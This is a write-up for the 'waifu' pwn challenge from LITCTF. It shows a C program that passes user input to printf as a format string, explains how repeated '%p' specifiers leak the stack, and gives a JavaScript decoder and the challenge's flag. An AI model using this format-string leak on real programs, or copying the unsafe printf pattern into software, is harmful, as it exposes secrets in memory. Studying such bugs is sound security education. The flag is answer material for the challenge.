# pwn/waifu

## Challenge

Honestly I just needed a name, I am almost out of time :skull:.
<br>
Connect with `nc litctf.live 31791`

[`waifu.zip`](https://drive.google.com/file/d/1SVW7rWSdpu3cPYDyATw5a9pJJMH0umTS/view)

## Solution

Ooooo, we're given a C file (and an executable):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
	setbuf(stdout, 0x0);

	FILE *f = fopen("flag.txt", "r");
	if(f == NULL){
		puts("Something is wrong. Please contact Rythm.");
		exit(1);
	}	

	char *buf = malloc(0x20);
	char *flag = alloca(0x1000);
	fgets(flag, 0x1000, f);

	puts("Do you like waifus?");

	scanf("%20s", buf);
	puts("");

	if(!strcmp(buf, "yes")){
		puts("Good.");
	}else{
		puts("Wtmoo how could you say:");
		printf(buf);
		puts("");
	}

	free(buf);

	return 0;
}
```
Because `scanf` (instead of `gets`) is used with a maximum number of characters read (20), this isn't a buffer overflow exploit like before, but it's still another classic problem.

The only output is the `printf`. Note the usage of `printf` over `puts`; `printf`'s first argument can contain format specifiers, which are filled in by the following arguments. But that means we can input format specifiers, but since there are no following arguments, they'll instead be filled in by the contents of the stack, including the flag.

Note the program will only read in 20 characters. To maximize data extracted, we use the format specifier `%p`, a 64-bit pointer address (instead of, say, `%x`, a 32-bit hex integer; to specify longer as in `%xl` uses up characters):
```py
print("%p"*10)
```
We get
```
0x7f5ea9d9b723(nil)0x7f5ea9cbc0770x190x7c0x667b46544354494c0x747833745f6d30720x755f68732e3772340x61616161616161770x7d61616161616161
```
(An null pointer (address 0) is printed as `(nil)`.) Conveniently, there are `0x`s delimiting each value. As these are little-endian, we reverse the bytes in each to get the character string:
```js
"..."
	.replaceAll("(nil)","0x0")
	.split("0x").slice(1) // get array of "addresses"
	.map(
		s=>s.padStart(16,"0").match(/../g).reverse().map( // reverse bytes (pairs of hex digits)
			c=>String.fromCharCode(parseInt(c,0x10)) // to ASCII
		).join("")
	).join("");
// "#·Ù©^\u007f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000wÀË©^\u007f\u0000\u0000\u0019\u0000\u0000\u0000\u0000\u0000\u0000\u0000|\u0000\u0000\u0000\u0000\u0000\u0000\u0000LITCTF{fr0m_t3xt4r7.sh_uwaaaaaaaaaaaaaa}"
```
A bunch of junk, and then our flag!

## Flag

`LITCTF{fr0m_t3xt4r7.sh_uwaaaaaaaaaaaaaa}`
